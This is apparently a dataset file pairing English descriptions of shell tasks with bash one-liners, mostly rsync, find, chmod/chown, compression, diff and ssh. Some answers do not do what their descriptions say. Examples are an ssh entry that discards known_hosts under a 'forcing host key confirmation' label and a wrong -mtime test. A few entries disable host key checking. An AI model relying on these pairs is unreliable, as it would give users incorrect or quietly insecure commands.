{"input": "Archive \"/home/path\" to \"path\" on host \"server\" showing progress and statistics and remove files in the destination not found in the source", "answer": "rsync -a --stats --progress --delete /home/path server:path"}
{"input": "Archive \"/home/user1\" to \"wobgalaxy02:/home/user1\" excluding hidden files", "answer": "rsync -av /home/user1 wobgalaxy02:/home/user1"}
{"input": "Archive \"/local/path/some_file\" to \"/some/path\" on host \"server.com\" authenticating as user \"usr\", compress data during transmission, show progress details", "answer": "rsync -avz --progress local/path/some_file usr@server.com:\"/some/path/\""}
{"input": "Archive \"/media/10001/music/\" on host \"server\" to local directory \"/media/incoming/music/\" and skip files that are newer in the destination, delete any files in the destination not in the source, and compress data during transmission", "answer": "rsync -avzru --delete-excluded server:/media/10001/music/ /media/Incoming/music/"}
{"input": "Archive \"/media/Incoming/music/\" to \"/media/10001/music/\" on host \"server\" and skip files that are newer in the destination, delete any files in the destination not in the source, and compress data during transmission", "answer": "rsync -avzru --delete-excluded /media/Incoming/music/ server:/media/10001/music/"}
{"input": "Archive \"/my/dir\" on host \"server\" as user \"user\" to the current local directory excluding files ending in \".svn\"", "answer": "rsync -av --exclude '*.svn' user@server:/my/dir ."}
{"input": "Archive \"/path/to/application.ini\" on host \"source_host\" to current directory", "answer": "rsync -avv source_host:path/to/application.ini ./application.ini"}
{"input": "Archive \"/path/to/copy\" on host \"remote.host\" as user \"user\" to \"/path/to/local/storage\" updating files with different checksums, showing human readable progress and statistics, and compressing data during transmission", "answer": "rsync -chavzP --stats user@remote.host:/path/to/copy /path/to/local/storage"}
{"input": "Archive \"/path/to/copy\" to \"/path/to/local/storage\" on host \"host.remoted.from\" as user \"user\" updating files with different checksums, showing human readable progress and statistics, and compressing data during transmission", "answer": "rsync -chavzP --stats /path/to/copy user@host.remoted.from:/path/to/local/storage"}
{"input": "Archive \"/path/to/files\" on host \"remotemachine\" authentifying as user \"user\" and compressing data during transmission, copy symlinks as symlinks", "answer": "rsync -avlzp user@remotemachine:/path/to/files /path/to/this/folder"}
{"input": "Archive \"/path/to/files\" to \"/path\" on host \"user@targethost\" with elevated permission on the remote host", "answer": "rsync -av --rsync-path=\"sudo rsync\" /path/to/files user@targethost:/path"}
{"input": "Archive \"/path/to/files\" to \"user@targethost:/path\"", "answer": "rsync -av /path/to/files user@targethost:/path"}
{"input": "Archive \"/path/to/files/source\" to \"user@remoteip:/path/to/files/destination\" via ssh on port 2121", "answer": "rsync -azP -e \"ssh -p 2121\" /path/to/files/source user@remoteip:/path/to/files/destination"}
{"input": "Archive \"/path/to/sfolder\" to \"name@remote.server:/path/to/remote/dfolder\" compressing the data during transmission", "answer": "rsync -avlzp /path/to/sfolder name@remote.server:/path/to/remote/dfolder"}
{"input": "Archive \"/path/to/sfolder\" to \"name@remote.server:/path/to/remote/dfolder\" preserving hard links and compressing the data during transmission", "answer": "rsync -aHvz /path/to/sfolder name@remote.server:/path/to/remote/dfolder"}
{"input": "Archive \"/path/to/sfolder/\" to \"name@remote.server:/path/to/remote/dfolder\" preserving hard links and compressing the data during transmission", "answer": "rsync -aHvz /path/to/sfolder/ name@remote.server:/path/to/remote/dfolder"}
{"input": "Archive \"/source\" and all files under \"folder/\" to \"/dstfolder/\" on host \"remoteserver\" as user \"user\" without copying files that already exist", "answer": "rsync -avz --ignore-existing /source folder/* user@remoteserver:/dstfolder/"}
{"input": "Archive \"/source/backup\" to \"/destination\" with compression during transfer", "answer": "rsync -ravz /source/backup /destination"}
{"input": "Archive \"/top/a/b/c/d\" to host \"remote\" using relative path names", "answer": "rsync -a --relative /top/a/b/c/d remote:/"}
{"input": "Archive \"/usr/local/\" to \"/BackUp/usr/local/\" on host \"XXX.XXX.XXX.XXX\" via ssh and show progress", "answer": "rsync --progress -avhe ssh /usr/local/  XXX.XXX.XXX.XXX:/BackUp/usr/local/"}
{"input": "Archive \"/var/www/test/\" to \"/var/www/test\" on host \"231.210.24.48\" as user \"ubuntu\" via ssh using identity file \"/home/test/pkey_new.pem\"", "answer": "rsync -rave \"ssh -i /home/test/pkey_new.pem\" /var/www/test/ ubuntu@231.210.24.48:/var/www/test"}
{"input": "Archive \"_vim/\" to \"~/.vim\" suppressing non-error messages and compressing data during transmission", "answer": "rsync -aqz _vim/ ~/.vim"}
{"input": "Archive \"_vimrc\" to \"~/.vimrc\" suppressing non-error messages and compressing data during transmission", "answer": "rsync -aqz _vimrc ~/.vimrc"}
{"input": "Archive \"directory\" preserving hard links from host \"remote\" to the current local directory and keep partial files, handle sparse files efficiently, and itemize changes made", "answer": "rsync -aPSHiv remote:directory ."}
{"input": "Archive \"fileToCopy\" to \"/some/nonExisting/dirToCopyTO\" on host \"ssh.myhost.net\" via ssh", "answer": "rsync -ave ssh fileToCopy ssh.myhost.net:/some/nonExisting/dirToCopyTO"}
{"input": "Archive \"foo/bar/baz.c\" to \"remote:/tmp/\" preserving the relative path of \"foo/bar/baz.c\"", "answer": "rsync -avR foo/bar/baz.c remote:/tmp/"}
{"input": "Archive \"myfile\" to \"/foo/bar/\" and create directory \"/foo/bar/\" if \"/foo/\" exists", "answer": "rsync -a myfile /foo/bar/"}
{"input": "Archive \"path/subfolder\" to \"path\", skipping files that are newer at the destination", "answer": "rsync -vuar --delete-after path/subfolder/ path/"}
{"input": "Archive \"path/to/working/copy\" to \"path/to/export\" excluding files or directories named \".svn\"", "answer": "rsync -a --exclude .svn path/to/working/copy path/to/export"}
{"input": "Archive \"somedir/./foo/bar/baz.c\" to \"remote:/tmp/\" preserving the relative path of \"foo/bar/baz.c\"", "answer": "rsync -avR somedir/./foo/bar/baz.c remote:/tmp/"}
{"input": "Archive \"source\" to \"destination\" via ssh on port \"PORT_NUMBER\"", "answer": "rsync -azP -e \"ssh -p PORT_NUMBER\" source destination"}
{"input": "Archive \"src\" to \"dst\" updating files existing in \"dst\"", "answer": "rsync -a -v src dst"}
{"input": "Archive \"src\" to \"dst\" without overwriting existing files in \"dst\"", "answer": "rsync -a -v --ignore-existing src dst"}
{"input": "Archive \"src-dir\" to \"dest-dir\" on \"remote-user@remote-host\" and delete any files in \"dest-dir\" not found in \"src-dir\"", "answer": "rsync -av --delete src-dir remote-user@remote-host:dest-dir"}
{"input": "Archive \"src/bar\" on host \"foo\" to local directory \"/data/tmp\"", "answer": "rsync -avz foo:src/bar /data/tmp"}
{"input": "Archive any files changed in the last day from \"remote_host\" to \"local_dir\"", "answer": "rsync -av remote_host:'$(find logs -type f -ctime -1)' local_dir"}
{"input": "Archive current directory to \"/some/path\" on localhost, using ssh to authentify as user \"me\", only update files that are newer in the source directory", "answer": "rsync -auve \"ssh -p 2222\" . me@localhost:/some/path"}
{"input": "Archive directory \".\" to \"server2::sharename/B\"", "answer": "rsync -av . server2::sharename/B"}
{"input": "Archive directory \"symdir\" to \"symdir_output\" preserving symbolic links", "answer": "rsync symdir/ symdir_output/ -a --copy-links -v"}
{"input": "Archive directory \"tata\" to directory \"tata2\", compressing data during copy", "answer": "rsync -avz tata/ tata2/"}
{"input": "Archive directory specified by variable \"i\" to \"/iscsi\" preserving relative paths", "answer": "rsync -avR $i /iscsi;"}
{"input": "Archive directory specified by variable \"myFolder\" to current directory", "answer": "rsync -av $myFolder ."}
{"input": "Archive file 'file' with bzip2 tool, store compressed data to a file 'logfile' and also print to screen", "answer": "bzip2 -c file | tee -a logfile"}
{"input": "Archive files (not directories) in \"sorce_dir\" to \"target_dir\"", "answer": "rsync -a --filter=\"-! */\" sorce_dir/ target_dir/"}
{"input": "Archive files in \"/mnt/source-tmp\" to \"/media/destination\"", "answer": "rsync -a /mnt/source-tmp /media/destination/"}
{"input": "Archive preserving permissions and ownership files in \"/var/www/\" on host \"user@10.1.1.2\" to local \"/var/www/\"", "answer": "sudo rsync -az user@10.1.1.2:/var/www/ /var/www/"}
{"input": "Archive showing progress \"sourcefolder\" to \"/destinationfolder\" excluding \"thefoldertoexclude\"", "answer": "rsync -av --progress sourcefolder /destinationfolder --exclude thefoldertoexclude"}
{"input": "Archive showing progress all files in \"/media/2TB\\ Data/data/music/\" to \"/media/wd/network_sync/music/\" excluding files matching \"*.VOB\", \"*.avi\", \"*.mkv\", \"*.ts\", \"*.mpg\", \"*.iso\", \"*ar\", \"*.vob\", \"*.BUP\", \"*.cdi\", \"*.ISO\", \"*.shn\", \"*.MPG\", \"*.AVI\", \"*.DAT\", \"*.img\", \"*.nrg\", \"*.cdr\", \"*.bin\", \"*.MOV\", \"*.goutputs*\", \"*.flv\", \"*.mov\", \"*.m2ts\", \"*.cdg\", \"*.IFO\", \"*.asf\", and \"*.ite\"", "answer": "rsync -av --progress --exclude=*.VOB --exclude=*.avi --exclude=*.mkv --exclude=*.ts --exclude=*.mpg --exclude=*.iso --exclude=*ar --exclude=*.vob --exclude=*.BUP --exclude=*.cdi --exclude=*.ISO --exclude=*.shn --exclude=*.MPG --exclude=*.AVI --exclude=*.DAT --exclude=*.img --exclude=*.nrg --exclude=*.cdr --exclude=*.bin --exclude=*.MOV --exclude=*.goutputs* --exclude=*.flv --exclude=*.mov --exclude=*.m2ts --exclude=*.cdg --exclude=*.IFO --exclude=*.asf --exclude=*.ite /media/2TB\\ Data/data/music/* /media/wd/network_sync/music/"}
{"input": "Archive the entire file system into tarfile.tar.bz2", "answer": "find / -print0 | xargs -0 tar cjf tarfile.tar.bz2"}
{"input": "Archive the list of 1st level subdirectories in /fss/fin to /fss/fi/outfile.tar.gz", "answer": "tar -czf /fss/fi/outfile.tar.gz `find /fss/fin -d 1 -type d -name \"*\" -print`"}
{"input": "Assigns MAC address 00:80:48:BA:d1:30 to interface eth0", "answer": "ifconfig eth0 hw ether 00:80:48:BA:d1:30"}
{"input": "Attempt to connect as root via ssh to host \"IP\" and copy /root/K to local machine, passing option \"StrictHostKeyChecking=no\" to the ssh backend - this will normally fail because ssh servers by default don't (and shouldn't) accept root logins", "answer": "scp -o StrictHostKeyChecking=no root@IP:/root/K"}
{"input": "Back up all *.txt files/directories in new files/directories with a .bak extension in their names under /etc directory", "answer": "find /etc -name \"*.txt\" | xargs -I {} mv {} {}.bak"}
{"input": "Backup all PHP files under the current directory tree", "answer": "find -name \"*.php\" \u2013exec cp {} {}.bak \\;"}
{"input": "Build an \"svn hotcopy\" command for each subdirectory of /usr/local/svn/repos/", "answer": "find /usr/local/svn/repos/ -maxdepth 1 -mindepth 1 -type d -printf \"%f\\0\" | xargs -0 -I{} echo svnadmin hotcopy /usr/local/svn/repos/\\{\\} /usr/local/backup/\\{\\}"}
{"input": "Change all \"JPG\" filename suffixes in current directory to \"jpeg\"", "answer": "rename -v 's/\\.JPG/\\.jpeg/' *.JPG"}
{"input": "Change all cron jobs running \"anm.sh\" to be run every 10 minutes instead of 5 minutes", "answer": "crontab -l | sed '/anm\\.sh/s#\\/5#\\/10#' | crontab -"}
{"input": "Change all directories under \"./bootstrap/cache/\" to owner \"apache\" and group \"laravel\"", "answer": "sudo find ./bootstrap/cache/ -type d -exec chown apache:laravel {} \\;"}
{"input": "Change all directories under \"./storage/\" to owner \"apache\" and group \"laravel\"", "answer": "sudo find ./storage/ -type d -exec chown apache:laravel {} \\;"}
{"input": "Change all file permissions to 664 and all directory permissions to 775 in directory tree \"htdocs\"", "answer": "find htdocs -type f -exec chmod 664 {} + -o -type d -exec chmod 775 {} +"}
{"input": "Change all files in \"~\" which are owned by the group \"vboxusers\" to be owned by the user group \"kent\"", "answer": "find ~ -group vboxusers -exec chown kent:kent {} \\;"}
{"input": "Change all files with no user under \"/var/www\" to have owner \"root\" and group \"apache\"", "answer": "sudo find /var/www -nouser -exec chown root:apache {} \\;"}
{"input": "Change every directory under \"/var/www/html/\" to have permissions 775", "answer": "sudo  find /var/www/html/ -type d -exec chmod 775 {} \\;"}
{"input": "Change every file under \"/var/www/html/\" to have permissions 664", "answer": "sudo  find /var/www/html/ -type f -exec chmod 664 {} \\;"}
{"input": "Change every reference to the colour red to green in all CSS files", "answer": "find . -name \"*.css\" -exec sed -i -r 's/#(FF0000|F00)\\b/#0F0/' {} \\;"}
{"input": "Change file permissions on all regular files within a directory", "answer": "find /path/to/directory -type f -exec chmod 644 {} +"}
{"input": "Change group ownership to `foo' for files with GID=2000", "answer": "find / -group 2000 -exec chgrp -h foo {} \\;"}
{"input": "Change mode of all files ending with \".php\" under the current folder to 755 and write the output to the console and \"logfile.txt\" file", "answer": "find . -name '*.php' -exec chmod 755 {} \\; | tee logfile.txt"}
{"input": "Change ownership of \"/data/db\" to the current user", "answer": "sudo chown `whoami` /data/db"}
{"input": "Change ownership of \"/vol\" to the current user", "answer": "sudo chown `whoami` /vol"}
{"input": "Change permissions to 755 for all directories in the current directory tree", "answer": "find . -type d | xargs chmod -v 755"}
{"input": "Change permissions to 755 for all subdirectories of the current directory", "answer": "find . -type d -print | sed -e 's/^/\"/' -e 's/$/\"/' | xargs chmod 755"}
{"input": "Change permissions to u=rw,g=r,o= for all files in the current directory tree", "answer": "find . -type f -exec chmod u=rw,g=r,o= '{}' \\;"}
{"input": "Change permissions to u=rw,g=r,o= for all files inside the current directory tree", "answer": "find . -type f -exec chmod u=rw,g=r,o= '{}' \\;"}
{"input": "Change permissions to u=rwx,g=rx,o= for all directories in the current directory tree", "answer": "find . -type d -exec chmod u=rwx,g=rx,o= '{}' \\;"}
{"input": "Change permissions to u=rwx,g=rx,o= for all directories inside the current directory tree", "answer": "find . -type d -exec chmod u=rwx,g=rx,o= '{}' \\;"}
{"input": "Change symbolic link \"$f\" into a file", "answer": "cp --remove-destination $(readlink $f) $f"}
{"input": "Change the file extension from '.txt' to '.bak' for all files/directories under current directory tree", "answer": "find . -name \"*.txt\" | sed \"s/\\.txt$//\" | xargs -i echo mv {}.txt {}.bak | sh"}
{"input": "Change the group of all directories (except those with a '.') under current directory tree to a group with the same name as the directory name", "answer": "find . -type d | sed -e 's/\\.\\///g' -e 's/\\./avoid/g' | grep -v avoid | awk '{print $1\"\\t\"$1}' | xargs chgrp"}
{"input": "Change the group to `temp' for all files in the current directory tree that belong to group `root'", "answer": "find . -group root -print | xargs chgrp temp"}
{"input": "Change the owner of \"/var/www/html/mysite/images/\" to \"nobody\"", "answer": "sudo chown nobody /var/www/html/mysite/images/"}
{"input": "Change the owner of \"/var/www/html/mysite/tmp_file_upload/\" to \"nobody\"", "answer": "sudo chown nobody /var/www/html/mysite/tmp_file_upload/"}
{"input": "Change the owner of all \".txt\" files in directory tree \"/mydir\" to \"root\"", "answer": "find /mydir -type f -name \"*.txt\" -execdir chown root {} ';'"}
{"input": "Change the owner of all files in \"/empty_dir/\" to \"root\" using at most 10 files at a time", "answer": "ls /empty_dir/ | xargs -L10 chown root"}
{"input": "Change the owner of all files in the current directory tree excluding those who match \"./var/foo*\" to \"www-data\"", "answer": "find . -not -iwholename './var/foo*' -exec chown www-data '{}' \\;"}
{"input": "Change the owner of all files in the directory tree \"dir_to_start\" excluding directory \"dir_to_exclude\" to \"owner\"", "answer": "find dir_to_start -name dir_to_exclude -prune -o -print0 | xargs -0 chown owner"}
{"input": "Change the owner of all files in the directory tree \"dir_to_start\" excluding file \"file_to_exclude\" to \"owner\"", "answer": "find dir_to_start -not -name \"file_to_exclude\"  -print0 | xargs -0 chown owner"}
{"input": "Change the ownership of \"/etc/udev/rules.d/51-android.rules\" to \"root\"", "answer": "sudo chown root. /etc/udev/rules.d/51-android.rules"}
{"input": "Change the ownership of all files in the current directory tree from root to www-data", "answer": "find -user root -exec chown www-data {} \\;"}
{"input": "Change the ownership to eva for all files/directories that belong to the user 'george' in the entire file system without traversing to other devices/partitions", "answer": "find -x / -user george -print0 | xargs -0 chown eva"}
{"input": "Change the permission to 644 for all files under current directory", "answer": "find . -type f | xargs -I{} chmod -v 644 {}"}
{"input": "Change the permission to 755 for all directories under current directory", "answer": "find . -type d | xargs chmod -v 755"}
{"input": "Change the permissions of every directory in the current directory and all files and directories within them to 700", "answer": "find . -maxdepth 1 -type d -exec chmod -R 700 {} \\;"}
{"input": "Change the permissions of the current directory and all its subdirectories to 755", "answer": "find . -type d -exec chmod 755 {} \\;"}
{"input": "Change to directory listed in file '$HOME/.lastdir'", "answer": "cd `cat $HOME/.lastdir`"}
{"input": "Change to location of '$TARGET_FILE' file", "answer": "cd `dirname $TARGET_FILE`"}
{"input": "Change user ownership to `foo' for files with UID=1005", "answer": "find / -user 1005 -exec chown -h foo {} \\;"}
{"input": "Change user to \"amzadm\" and group to \"root\" of \"/usr/bin/aws\"", "answer": "chown amzadm.root  /usr/bin/aws"}
{"input": "Changes the group of defined file", "answer": "chgrp"}
{"input": "Checks compressed file integrity", "answer": "bzip2 -t file.bz2"}
{"input": "Checks that 'monit' user is in 'www-data' group", "answer": "groups monit |grep www-data"}
{"input": "Clean the current directory from all subversion directories recursively", "answer": "find . -type d -name \".svn\" -print | xargs rm -rf"}
{"input": "Clean up all zombie processes by instantly killing their parent process with SIGKILL signal", "answer": "kill -9 $(ps -A -ostat,ppid | grep -e '[zZ]'| awk '{ print $2 }')"}
{"input": "Clean up all zombie processes by sending SIGTERM signal to their parent process, which requests them to terminate", "answer": "kill $(ps -A -ostat,ppid | awk '/[zZ]/{print $2}')"}
{"input": "Clear the in-memory history and read from the current history file", "answer": "history -cr"}
{"input": "Collapse double slashes in variable \"dir\" into a single one", "answer": "dir=\"`echo $dir | sed s,//,/,g`\""}
{"input": "Combine every two lines of standard input", "answer": "paste -d \"\" - -"}
{"input": "Compare \"current.log\" and \"previous.log\" line by line and print lines containing regex pattern \">\\|<\"", "answer": "diff current.log previous.log | grep \">\\|<\" #comparring users lists"}
{"input": "Compare \"fastcgi_params\" and \"fastcgi.conf\" line by line, output 3 lines of unified context, and print the C function the change is in", "answer": "diff -up fastcgi_params fastcgi.conf"}
{"input": "Compare \"file1\" and \"file2\" line by line with 3 lines of unified context", "answer": "diff -u file1 file2"}
{"input": "Compare *.csv files in the current directory tree with their analogs stored in /some/other/path/", "answer": "find . -name \"*.csv\" -exec diff {} /some/other/path/{} \";\" -print"}
{"input": "Compare *.csv files in the current directory tree with their analogs stored in /some/other/path/ prompting before running `diff'", "answer": "find . -okdir diff {} /some/other/path/{} \";\""}
{"input": "Compare column 3 with column 2 of the next line in \"file\" and format output as a table", "answer": "awk 'NR==1 { print; next } { print $0, ($1 == a && $2 == b) ? \"equal\" : \"not_equal\"; a = $1; b = $3 }' file | column -t"}
{"input": "Compare each .xml file under the current directory with a file of the same name in \"/destination/dir/2\"", "answer": "find . -name *.xml -exec diff {} /destination/dir/2/{} \\;"}
{"input": "Compare each file in \"repos1/\" and \"repos2/\", treat absent files as empty, ignore differences in whitespace and tab expansions, and print 3 lines of unified context", "answer": "diff -ENwbur repos1/ repos2/"}
{"input": "Compare files \"A1\" and \"A2\" with 3 lines of unified context and print lines beginning with \"+\"", "answer": "diff -u A1 A2 | grep -E \"^\\+\""}
{"input": "Compare files 'file1' and 'file2' and print in three columns strings unique for first file, second file, and common ones", "answer": "comm abc def"}
{"input": "Compare files in \"/tmp/dir1\" and \"/tmp/dir2\", treat absent files as empty and all files as text, and print 3 lines of unified context", "answer": "diff -Naur dir1/ dir2"}
{"input": "Compare files in \"/tmp/dir1\" and \"/tmp/dir2\", treating absent files as empty and all files as text", "answer": "diff -Nar /tmp/dir1 /tmp/dir2/"}
{"input": "Compare sorted files 'f1.txt' and 'f2.txt' and print in three columns strings unique for first file, second file, and common ones", "answer": "comm <(sort -n f1.txt) <(sort -n f2.txt)"}
{"input": "Compare the contents of gzip-ompressed files \"file1\" and \"file2\"", "answer": "diff <(zcat file1.gz) <(zcat file2.gz)"}
{"input": "Compare the files in 'FOLDER1' and 'FOLDER2' and show which ones are indentical and which ones differ", "answer": "find FOLDER1 -type f -print0 | xargs -0 -I % find FOLDER2 -type f -exec diff -qs --from-file=\"%\" '{}' \\+"}
{"input": "Compares two listings 'ls' and 'ls *Music*', showing only strings that unique for first listing", "answer": "comm -23 <(ls) <(ls *Music*)"}
{"input": "Compose filepath as folder path where file $SRC is located, and lowercase filename of $SRC file, and save it in 'DST' variable", "answer": "DST=`dirname \"${SRC}\"`/`basename \"${SRC}\" | tr '[A-Z]' '[a-z]'`"}
{"input": "Compose filepath as folder path where file $f is located, and lowercase filename of $f file, and save it in 'g' variable", "answer": "g=`dirname \"$f\"`/`basename \"$f\" | tr '[A-Z]' '[a-z]'`"}
{"input": "Composes full process tree with process id numbers, and prints only those strings that contain 'git'", "answer": "pstree -p | grep git"}
{"input": "Compress \"hello world\" and save to variable \"hey\"", "answer": "hey=$(echo \"hello world\" | gzip -cf)"}
{"input": "Compress \"my_large_file\" with gzip and split the result into files of size 1024 MiB with prefix \"myfile_split.gz_\"", "answer": "gzip -c my_large_file | split -b 1024MiB - myfile_split.gz_"}
{"input": "Compress all \".txt\" files in all sub directories with gzip", "answer": "gzip */*.txt"}
{"input": "Compress all *.img files using bzip2", "answer": "find ./ -name \"*.img\" -exec bzip2 -v {} \\;"}
{"input": "Compress all directories found in $LOGDIR wherein a file's data has been modified within the last 24 hours", "answer": "find $LOGDIR -type d -mtime +0 -exec compress -r {} \\;"}
{"input": "Compress all directories found in directory tree $LOGDIR that have been modified within the last 24 hours", "answer": "find $LOGDIR -type d -mtime -1 -exec compress -r {} \\;"}
{"input": "Compress all files in directory \"$PATH_TO_LOGS\" that were last modified more than \"$SOME_NUMBER_OF_DAYS\" days ago", "answer": "find $PATH_TO_LOGS -maxdepth 1 -mtime +$SOME_NUMBER_OF_DAYS -exec gzip -N {} \\;"}
{"input": "Compress all files in the \"$FILE\" directory tree that were last modified 30 days ago", "answer": "find $FILE -type f -mtime 30 -exec gzip {} \\;"}
{"input": "Compress all files in the \"$FILE\" directory tree that were last modified 30 days ago and have not already been compressed with gzip", "answer": "find $FILE -type f -not -name '*.gz' -mtime 30 -exec gzip {} \\;"}
{"input": "Compress all files under /source directory tree using gzip with best compression method", "answer": "find /source -type f -print0 | xargs -0 -n 1 -P $CORES gzip -9"}
{"input": "Compress all files under current directory tree with gzip", "answer": "find . -type f -print0 | xargs -0r gzip"}
{"input": "Compress all files with '.txt' extension under current directory", "answer": "echo *.txt | xargs gzip -9"}
{"input": "Compress and display the gzip compression ratio of every file on the system that is greater than 100000 bytes and ends in \".log\"", "answer": "sudo find / -xdev -type f -size +100000 -name \"*.log\" -exec gzip -v {} \\;"}
{"input": "Compress and display the original filename of every file on the system that is greater than 100000 bytes and ends in \".log\"", "answer": "sudo find / -xdev -type f -size +100000 -name \"*.log\" -exec gzip {} \\; -exec echo {} \\;"}
{"input": "Compress every file in the current directory tree with gzip and keep file extensions the same", "answer": "find folder -type f -exec gzip -9 {} \\; -exec mv {}.gz {} \\;"}
{"input": "Compress files excluding *.Z files", "answer": "find . \\! -name \"*.Z\" -exec compress -f {} \\;"}
{"input": "Compress from standard input and print the byte count preceded with 'gzip.'", "answer": "echo gzip. $( gzip | wc -c )"}
{"input": "Compress the file 'file' with 'bzip2' and append all output to the file 'logfile' and stdout", "answer": "bzip2 file | tee -a logfile"}
{"input": "Compresses all '*.xml' files under current directory with 'bzip2' utility", "answer": "find -name \\*.xml -print0 | xargs -0 -n 1 -P 3 bzip2"}
{"input": "Compresses all files in a current folder (not recursively)", "answer": "bzip2 *"}
{"input": "Compresses all files in the directory 'PATH_TO_FOLDER' without recursion and keeps uncompressed files from deletion", "answer": "find PATH_TO_FOLDER -maxdepth 1 -type f -exec bzip2 -zk {} \\;"}
{"input": "Compresses all files listed in array $*, executing in background", "answer": "compress $* &"}
{"input": "Compresses with compression level 9 all files under the current folder but already compressed '*.bz2' files, performing in background", "answer": "find \"$1\" -type f | egrep -v '\\.bz2' | xargs bzip2 -9 &"}
{"input": "Concatenate with a space every other line in \"input.txt\"", "answer": "paste -s -d' \\n' input.txt"}
{"input": "Connect as ssh user specified by variable USER to host whose IP address or host name is specified by HOST, and copy remote file specified by variable SRC to location on local host specified by variable DEST, disabling progress info but enabling debug info", "answer": "scp -qv $USER@$HOST:$SRC $DEST"}
{"input": "Connect to host \"${HOSTNAME}\" as user \"${USERNAME}\" and execute \"${SCRIPT}\" non-interactively", "answer": "ssh -l ${USERNAME} ${HOSTNAME} \"${SCRIPT}\""}
{"input": "Connect to host \"remotehost\" as ssh user \"user\" to copy remote file \"/location/KMST_DataFile_*.kms\" to current directory on local host", "answer": "scp -v user@remotehost:/location/KMST_DataFile_*.kms"}
{"input": "Connect to host 'hostname' as user 'username' by forcing host key confirmation", "answer": "ssh -o UserKnownHostsFile=/dev/null username@hostname"}
{"input": "Connect to port 1234 of specified IP address or hostname as ssh user \"user\", and copy all visible files in /var/www/mywebsite/dumps/ on this host to local directory /myNewPathOnCurrentLocalMachine - this directory must already exist on local host", "answer": "scp -P 1234 user@[ip address or host name]:/var/www/mywebsite/dumps/* /var/www/myNewPathOnCurrentLocalMachine"}
{"input": "Continuously answer \"y\" to any prompt from \"mv ...\"", "answer": "yes | mv ..."}
{"input": "Continuously convert \"20131202\" into \"2013 12 02\" and print the result", "answer": "yes a=\\\"20131202\\\" | sed -e :a -e 's/...\\([0-9]\\{4\\}\\)\\([0-9]\\{2\\}\\)\\([0-9]\\{2\\}\\)./\\1 \\2 \\3/'"}
{"input": "Continuously print the seconds since Unix epoch and the ping time to \"google.com\"", "answer": "ping google.com | awk -F'[ =]' 'NR>1{print system(\"echo -n $(date +%s)\"), $11}'"}
{"input": "Continuously send \"y\" to all prompts of command \"rm\"", "answer": "yes | rm"}
{"input": "Continuously send ping requests to broadcast address \"10.10.0.255\" and print the IP addresses who respond", "answer": "ping -b 10.10.0.255 | grep 'bytes from' | awk '{ print $4 }'"}
{"input": "Correct permissions for directories in the web directory", "answer": "find /your/webdir/ -type d -print0 | xargs -0 chmod 755"}
{"input": "Correct permissions for files in the web directory", "answer": "find /your/webdir -type f | xargs chmod 644"}
{"input": "Creae a tarball 'files.tar.gz' containing all regular files under current directory tree that are newer than 2013-12-04 and older than 2013-12-05", "answer": "find . -type f -name \"*\" -newermt 2013-12-04 ! -newermt 2013-12-05 | xargs -I {} tar -czvf files.tar.gz {}"}
{"input": "Create 1000 files each file having a number from 1 to 1000 named \"file000\" to \"file999\"", "answer": "seq 1 1000 | split -l 1 -a 3 -d - file"}
{"input": "Create 6-letter named temporary directory in a folder path that is provided as the first positional parameter, and save the path to it in a variable 'tmp'", "answer": "tmp=$(mktemp -d $(dirname \"$1\")/XXXXXX)"}
{"input": "Create 6-letter named temporary file in a folder path $file1, and save the path to it in a variable 'tmpfile'", "answer": "tmpfile=$(mktemp $(dirname \"$file1\")/XXXXXX)"}
{"input": "Create 6-letter named temporary file in a folder path that is provided as the first positional parameter, and save the path to it in a variable 'tmpfile'", "answer": "tmpfile=$(mktemp $(dirname \"$1\")/XXXXXX)"}
{"input": "Create 998 directories one inside another with sequential names folder1, folder2, ... folder998 and create an additional folder named 'folder9991000' inside the last 'folder998' directory", "answer": "mkdir -p folder$( seq -s \"/folder\" 999 )1000"}
{"input": "Create a copy of index.html in all directories in current directory whose name contains Va, pausing for confirmation before overwriting any existing files - names may not contain spaces", "answer": "find . -mindepth 1 -maxdepth 1 -type d| grep \\/a |xargs -n 1 cp -i index.html"}
{"input": "Create a copy of index.html in all directories in current directory, pausing for confirmation before overwriting any existing files - names may not contain spaces - names may not contain spaces", "answer": "find . -mindepth 1 -maxdepth 1 -type d| xargs -n 1 cp -i index.html"}
{"input": "Create a gzip archive file ($tarFile) of all *.log files under $sourcePath", "answer": "find $sourcePath -type f -name \"*.log\" -exec tar -uvf $tarFile {} \\;"}
{"input": "Create a local SSH tunnel from \"localhost\" port 16379 to \"localhost\" port 6379 using key \"keyfile.rsa\" and disables the interactive shell", "answer": "ssh -i keyfile.rsa -T -N -L 16379:localhost:6379 someuser@somehost"}
{"input": "Create a new RSA key for ssh with no passphrase, store it in ~/.ssh/id_rsa without prompting to overwrite if this file exists, and minimize output from ssh-keygen", "answer": "echo -e  'y\\n'|ssh-keygen -q -t rsa -N \"\" -f ~/.ssh/id_rsa"}
{"input": "Create a new directory \"existing-dir/new-dir/\" on host \"node\"", "answer": "rsync /dev/null node:existing-dir/new-dir/"}
{"input": "Create a report of the contents of a USB drive mounted at find /path/to/drive", "answer": "find /path/to/drive -type f -exec file -b '{}' \\; -printf '%s\\n' | awk -F , 'NR%2 {i=$1} NR%2==0 {a[i]+=$1} END {for (i in a) printf(\"%12u %s\\n\",a[i],i)}' | sort -nr"}
{"input": "Create a ssh key and store it in the file ~/.ssh/apache-rsync", "answer": "ssh-keygen -f ~/.ssh/apache-rsync"}
{"input": "Create a ssh key with no passphrase and store it in \"outfile\"", "answer": "ssh-keygen -f outfile -N ''"}
{"input": "Create a ssh tunnel on local port 2222 through \"bridge.example.com\" to \"remote.example.com\" port 22 without executing any commands and run in the background", "answer": "ssh -N -L 2222:remote.example.com:22 bridge.example.com&"}
{"input": "Create a tar archive with all *.java files under the current directory", "answer": "find . -type f -name \"*.java\" | xargs tar cvf myfile.tar"}
{"input": "Create a tar file containing all the files in ~/Library folder that contain spaces in their names", "answer": "find ~/Library -name '* *' -print0 | xargs -0 tar rf blah.tar"}
{"input": "Create a variable CDATE in the current shell that contains the date in '%Y-%m-%d %H:%M:%S' format , and a variable EPOCH that contains the seconds since epoch", "answer": "source  <(date +\"CDATE='%Y-%m-%d %H:%M:%S' EPOCH='%s'\")"}
{"input": "Create archive \"backup1.tar\" of all subdirectories of the current directory", "answer": "find . -mindepth 1 -maxdepth 1 -type d | awk 'BEGIN {FS=\"./\"}; {print $2}' | xargs -d '\\n' tar czf backup1.tar"}
{"input": "Create compressed archive from \"my_large_file_1\" and \"my_large_file_2\" and split into files of size 1024 MiB with prefix \"myfiles_split.tgz_\"", "answer": "tar cz my_large_file_1 my_large_file_2 | split -b 1024MiB - myfiles_split.tgz_"}
